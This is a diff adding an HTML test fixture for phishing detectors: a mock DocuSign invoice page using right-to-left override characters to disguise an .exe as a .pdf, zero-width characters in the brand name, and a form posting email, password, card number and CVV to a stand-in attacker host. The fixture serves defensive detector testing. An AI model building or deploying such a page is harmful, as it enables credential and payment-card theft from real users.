@@ -1,0 +1,68 @@
+<!doctype html>
+<!--
+  ============================================================================
+  FOR LOCAL TESTING ONLY — DO NOT DEPLOY.
+  Mock-up showcasing Unicode-trickery attacks combined with credential
+  harvest. The page title and visible text are spiked with bidi-override
+  (U+202E) characters; clicking the "download" link reveals a file whose
+  display name reads "receipt-pdf" but whose real name is "receipt-exe".
+
+  Exercise the LocalPhish detectors:
+    - dom.bidi_override_in_text         — bidi character in page title / body
+    - dom.zero_width_in_text            — zero-width joiner in body copy
+    - dom.password_cross_etld1_post     — credentials shipped to attacker
+    - dom.card_and_password             — credit card collected alongside password
+  ============================================================================
+-->
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <!-- U+202E reverses the part after it; render shows "Invoice .exe.pdf" reversed. -->
+    <title>Invoice ‮exe.pdf‬ — DocuSign</title>
+    <style>
+      body { margin: 0; font-family: 'Helvetica Neue', system-ui, sans-serif; background: #f5f6f8; color: #222; }
+      .frame { max-width: 480px; margin: 64px auto; padding: 36px; background: white; box-shadow: 0 1px 4px rgba(0,0,0,0.15); }
+      h1 { font-size: 22px; margin-top: 0; }
+      .download { display: inline-block; padding: 10px 18px; background: #ffae42; color: #111; font-weight: 600; text-decoration: none; margin: 12px 0; }
+      input { width: 100%; padding: 8px; margin: 4px 0 12px; border: 1px solid #aaa; box-sizing: border-box; font-size: 15px; }
+      button { padding: 10px 22px; background: #d9281b; color: white; border: 0; font-size: 14px; cursor: pointer; }
+    </style>
+  </head>
+  <body>
+    <main class="frame">
+      <!--
+        ‌ and ​ below are U+200C (ZWNJ) and U+200B (ZWSP). They render
+        as nothing but trip the zero-width detector. The bidi override
+        in the title is the more visible attack; the zero-widths here are
+        belt-and-braces to test both signals at once.
+      -->
+      <h1>Doc​uSig‌n — pending invoice</h1>
+      <p>An invoice from <strong>Acme Holdings, LLC</strong> requires your verification before the
+        funds release. The attached file is signed and encrypted. To open it, log in with your
+        DocuSign credentials below.</p>
+
+      <!--
+        The link displays "Invoice .exe.pdf" because U+202E reverses
+        everything after the trigger. Real file is whatever follows .exe.
+      -->
+      <p><a href="/files/payload" class="download">Download Invoice ‮exe.pdf‬</a></p>
+
+      <h2>Sign in to view</h2>
+      <form action="https://collect.evil-host.zip/api/submit" method="post">
+        <label>Email
+          <input type="email" name="email" placeholder="you@example.com" required />
+        </label>
+        <label>Password
+          <input type="password" name="password" required />
+        </label>
+        <label>Credit card on file (last 4)
+          <input type="text" name="cardnumber" placeholder="4111 1111 1111 1111" autocomplete="cc-number" required />
+        </label>
+        <label>CVV
+          <input type="text" name="cvv" placeholder="123" autocomplete="cc-csc" required />
+        </label>
+        <button type="submit">Unlock document</button>
+      </form>
+    </main>
+  </body>
+</html>
